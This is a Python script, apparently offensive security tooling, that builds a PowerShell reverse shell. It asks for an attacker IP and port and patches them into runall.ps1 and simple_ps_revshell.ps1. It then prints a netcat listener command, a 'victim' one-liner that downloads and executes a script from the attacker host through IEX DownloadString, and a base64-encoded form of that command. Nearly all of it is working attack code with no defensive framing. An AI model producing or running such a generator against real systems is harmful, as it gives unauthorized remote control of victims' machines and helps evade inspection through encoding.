#!/usr/bin/env python3
import re
import os
import ipaddress

def validate_ipv4(ip_str):
    """Validate that the input is a valid IPv4 address"""
    try:
        ipaddress.ip_address(ip_str)
        return isinstance(ipaddress.ip_address(ip_str), ipaddress.IPv4Address)
    except ValueError:
        return False

def update_runall_ps1(lhost):
    """Update the IP address in the first line of runall.ps1"""
    try:
        with open("runall.ps1", "r") as f:
            lines = f.readlines()
        
        if len(lines) < 1:
            print("[-] Error: runall.ps1 is empty")
            return False
        
        if lines[0].startswith("$ip = "):
            lines[0] = f"$ip = '{lhost}'\n"
        else:
            print("[-] Error: First line of runall.ps1 doesn't match expected pattern")
            return False
        
        with open("runall.ps1", "w") as f:
            f.writelines(lines)
        
        print("[+] Successfully updated runall.ps1 with new IP address")
        return True
    except Exception as e:
        print(f"[-] Error updating runall.ps1: {e}")
        return False

def update_simple_ps_revshell(lhost, lport):
    """Update IP and port in simple_ps_revshell.ps1"""
    try:
        with open("simple_ps_revshell.ps1", "r") as f:
            content = f.read()
        
        # Find and replace the IP and port in the TCPClient connection string
        updated_content = re.sub(
            r"\$client = New-Object System.Net.Sockets.TCPClient\('.*?',\d+\)",
            f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport})",
            content
        )
        
        with open("simple_ps_revshell.ps1", "w") as f:
            f.write(updated_content)
        
        print("[+] Successfully updated simple_ps_revshell.ps1 with new IP and port")
        return True
    except Exception as e:
        print(f"[-] Error updating simple_ps_revshell.ps1: {e}")
        return False

def generate_encoded_command(lhost):
    """Generate the base64 encoded PowerShell command"""
    download_cmd = f"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/runall.ps1')"
    encoded_cmd = base64.b64encode(download_cmd.encode('utf-16le')).decode('utf-8')
    return f"powershell -e {encoded_cmd}"

def main():
    print("\n=== Simple PowerShell Reverse Shell Generator ===")
    
    # Get and validate LHOST input (IPv4 only)
    while True:
        lhost = input("Enter attacker IP address: ").strip()
        if validate_ipv4(lhost):
            break
        print("[-] Invalid IPv4 address. Please enter a valid IPv4 address (e.g., 192.168.1.100)")
    
    # Get LPORT input
    while True:
        lport = input("Enter listening port (e.g., 443): ").strip()
        if lport.isdigit() and 1 <= int(lport) <= 65535:
            break
        print("[-] Invalid port. Please enter a number between 1 and 65535")
    
    # Update runall.ps1
    if not update_runall_ps1(lhost):
        sys.exit(1)
    
    # Update simple_ps_revshell.ps1
    if not update_simple_ps_revshell(lhost, lport):
        sys.exit(1)
    
    # Print usage instructions
    print("\n[+] Start netcat listener:")
    print(f"    nc -lvp {lport}")
    
    print("\n[+] In victim's cmd shell:")
    print(f"    powershell -c IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/runall.ps1')")
    
    # Generate and print encoded command
    encoded_cmd = generate_encoded_command(lhost)
    print("\n[+] Encoded PowerShell command:")
    print(encoded_cmd)

if __name__ == "__main__":
    import sys
    import base64
    main()
